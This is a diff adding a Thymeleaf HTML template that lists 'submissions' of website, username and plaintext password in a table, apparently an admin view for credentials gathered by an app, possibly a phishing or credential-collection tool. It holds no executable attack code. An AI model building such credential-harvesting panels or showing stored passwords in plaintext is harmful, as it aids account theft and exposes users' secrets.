@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <title>Submissions</title>
+</head>
+<body>
+<h2>Submissions</h2>
+<table>
+    <tr>
+        <th>Id</th>
+        <th>Website</th>
+        <th>Username</th>
+        <th>Password</th>
+    </tr>
+    <tr th:each="submission : ${submissions}">
+        <td th:text="${submission.submissionTime}"></td>
+        <td th:text="${submission.website}"></td>
+        <td th:text="${submission.username}"></td>
+        <td th:text="${submission.password}"></td>
+    </tr>
+</table>
+</body>
+</html>
